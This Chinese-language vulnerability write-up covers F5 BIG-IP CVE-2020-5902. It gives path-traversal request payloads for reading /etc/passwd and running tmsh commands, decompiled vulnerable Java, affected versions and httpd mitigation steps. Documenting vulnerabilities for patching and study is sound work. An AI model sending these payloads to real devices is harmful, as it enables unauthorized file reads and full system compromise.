## F5 BIG-IP 远程代码执行漏洞（CVE-2020-5902） {docsify-ignore}

编辑：[@r4v3zn](https://github.com/0nise)

分析作者：[@Jas502n](https://github.com/jas502n)

### Payload

```
GET /tmui/login.jsp/..;/tmui/system/user/authproperties.jsp 
GET /tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=AnyMsgHereWillBeReflectedInTheResponse
```

![](cve-2020-5902/1.png)

任意文件读取

```
GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
```

![](cve-2020-5902/2.png)

RCE：

```
GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
```

执行命令：https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions

![](cve-2020-5902/3.png)

### 概况

F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。2020 年7 月 1日，F5 公布流量管理用户界面（TMUI），也称为配置实用程序，在未公开的页面中具有远程执行代码（RCE）漏洞，漏洞编号为 CVE-2020-5902。

攻击者可利用该漏洞执行任意的系统命令、创建或删除文件，关闭服务/执行任意的Java代码，可能完全入侵系统，对此漏洞 CVSS 评分 10 分。

### 影响版本

- BIG-IP = 15.1.0
- BIG-IP = 15.0.0
- BIG-IP 14.1.0 - 14.1.2
- BIG-IP 13.1.0 - 13.1.3
- BIG-IP 12.1.0 - 12.1.5
- BIG-IP 11.6.1 - 11.6.5

### 分析过程

漏洞点：

```java
JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd, request);
```

```java
/usr/local/www/tmui/WEB-INF/lib/tmui.jar/com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand
```

```java
public static JSONObject runTmshCommand(String command, HttpServletRequest request) {
    F5Logger logger = (F5Logger)F5Logger.getLogger(WorkspaceUtils.class);
    JSONObject resultObject = new JSONObject();
    String output = "";
    String error = "";
    if (!csrfValidated(request.getHeader("_bufvalue"), request.getHeader("_timenow"), request.getHeader("Tmui-Dubbuf"))) {
      logger.warn("Invalid user token - token provided by user is not authorized");
      resultObject.put("output", output);
      resultObject.put("error", NLSEngine.getString("ilx.workspace.error.InvalidUserToken"));
      return resultObject;
    } 
    if ("POST".equalsIgnoreCase(request.getMethod())) {
      String[] cmdArray = command.split(" ");
      String operation = cmdArray[0];
      String module = cmdArray[2];
      if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals("create") || operation.equals("delete") || operation.equals("list") || operation.equals("modify")) && WHITELISTED_TMSH_MODULES.contains(module)) {
        try {
          String[] args = { command };
          Syscall.Result result = Syscall.callElevated(Syscall.TMSH, args);
          output = result.getOutput();
          error = result.getError();
        } catch (com.f5.tmui.util.Syscall.CallException e) {
          logger.error(NLSEngine.getString("ilx.workspace.error.TmshCommandFailed") + ": " + e.getMessage());
          error = e.getMessage();
        } 
      } else {
        error = NLSEngine.getString("ilx.workspace.error.RejectedTmshCommand");
      } 
    } else {
      error = NLSEngine.getString("ilx.workspace.error.InvalidMethod");
    } 
    resultObject.put("output", output);
    resultObject.put("error", error);
    return resultObject;
}
```

### 靶场

无

### 修复

1. 登陆 TMOS Shell（**tmsh**）执行：

`tmsh`

2. 修改 httpd 配置信息：

```
edit /sys httpd all-properties
```

3. 找到`include` 部分并添加以下内容：

```
include '
<LocationMatch ".*\.\.;.*">
Redirect 404 /
</LocationMatch>
'
```

4. 通过输入以下命令，将更改写入并保存到配置文件中：

```
Esc
:wq!
```

5. 通过输入以下命令来保存配置：

```
save /sys config
```

6. 通过输入以下命令来重新启动**httpd**服务：

```
restart sys service httpd
```

也可以通过升级的方式来进行修复：

- BIG-IP 15.x 升级至 15.1.0.4

- BIG-IP 14.x 升级至 14.1.2.6
- BIG-IP 13.x 升级至 13.1.3.4
- BIG-IP 12.x 升级至 12.1.5.2
- BIG-IP 11.x 升级至 11.6.5.2

### 分析文章

- [CVE-2020-5902](https://github.com/jas502n/CVE-2020-5902)

### 参考

- https://twitter.com/Nep_1337_1998/status/1279610946864820225
- https://github.com/jas502n/CVE-2020-5902